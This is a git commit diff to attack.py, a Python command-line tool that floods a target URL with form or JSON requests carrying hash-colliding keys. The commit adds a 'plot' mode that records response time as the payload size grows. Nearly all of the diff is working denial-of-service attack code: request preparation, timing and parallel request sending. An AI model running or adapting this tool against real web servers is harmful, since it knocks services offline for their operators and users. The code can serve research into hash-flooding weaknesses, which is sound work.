07a8a54247b257ef948d3f4a862283653d1468cd
Lukas Martinelli <me@lukasmartinelli.ch>
2014-07-30 14:26:17 +0200

    Added plot functionality to attack.py

--- attack.py
+++ attack.py
@@ -2,6 +2,7 @@
 """Start a hash complexity attack
 Usage:
     attack.py <url> <collisions> [--count <parallel_requests>] [--type <attack_type>] [--no-collide] [--shuffle]
+    attack.py plot <url> <collisions> [--type <attack_type>] [--no-collide] [--shuffle]
     attack.py (-h | --help)
 
 Options:
@@ -66,19 +67,12 @@ def make_requests(reqs):
         resp.close()
     return successful_responses, failed_responses
 
-if __name__ == "__main__":
-    arguments = docopt(__doc__)
-    url = arguments["<url>"]
-    collision_file = arguments["<collisions>"]
-    count = int(arguments['--count'])
-    attack_type = arguments['--type']
 
-    payload = prepare_payload(collision_file,
-                              collide=not arguments["--no-collide"])
+def prepare_requests(url, payload, attack_type, shuffle):
     reqs = []
 
     for i in range(0, count):
-        if arguments["--shuffle"] and i % 10 == 0:
+        if shuffle and i % 10 == 0:
             payload = shuffle_payload(payload)
         if attack_type == "form":
             req = attack_with_form_fields(url, payload)
@@ -86,12 +80,60 @@ if __name__ == "__main__":
             req = attack_with_json_api(url, payload)
         reqs.append(req)
 
-    print("Sent {0} {1} requests to {2} ".format(count, attack_type, url))
-    print("Waiting for response of all requests...")
-    start = time.time()
-    successful_responses, failed_responses = make_requests(reqs)
-    end = time.time()
-    request_time = end - start
-    print("Total time: {0} seconds".format(request_time))
-    print("Successful: {0}".format(successful_responses))
-    print("Failed: {0}".format((failed_responses)))
+    return reqs
+
+
+if __name__ == "__main__":
+    arguments = docopt(__doc__)
+    url = arguments["<url>"]
+    collision_file = arguments["<collisions>"]
+    count = int(arguments['--count'])
+    attack_type = arguments['--type']
+    shuffle = arguments["--shuffle"]
+
+    payload = prepare_payload(collision_file, not arguments['--no-collide'])
+
+    def step_through(limit, callback):
+        step = 10
+        i = 0
+        while i < limit:
+            if step < 1000:
+                step += 10
+            else:
+                step = 1000
+            callback(i)
+            i += step
+
+    def limited_attack(index):
+        items = payload.items()
+        items = OrderedDict(items[:index])
+        reqs = prepare_requests(url,
+                                items,
+                                attack_type=attack_type,
+                                shuffle=shuffle)
+        start = time.time()
+        successful_responses, failed_responses = make_requests(reqs)
+        end = time.time()
+        request_time = end - start
+        print("{0},{1},{2},{3}".format(index, request_time, successful_responses, failed_responses))
+
+    def debug_attack():
+        reqs = prepare_requests(url,
+                                payload,
+                                attack_type=attack_type,
+                                shuffle=shuffle)
+        print("Sent {0} {1} requests to {2} ".format(count, attack_type, url))
+        print("Waiting for response of all requests...")
+        start = time.time()
+        successful_responses, failed_responses = make_requests(reqs)
+        end = time.time()
+        request_time = end - start
+        print("Total time: {0} seconds".format(request_time))
+        print("Successful: {0}".format(successful_responses))
+        print("Failed: {0}".format((failed_responses)))
+
+    if arguments["plot"]:
+        print("{0},{1},{2},{3}".format("index", "request_time", "successful_responses", "failed_responses"))
+        step_through(len(payload), limited_attack)
+    else:
+        debug_attack()
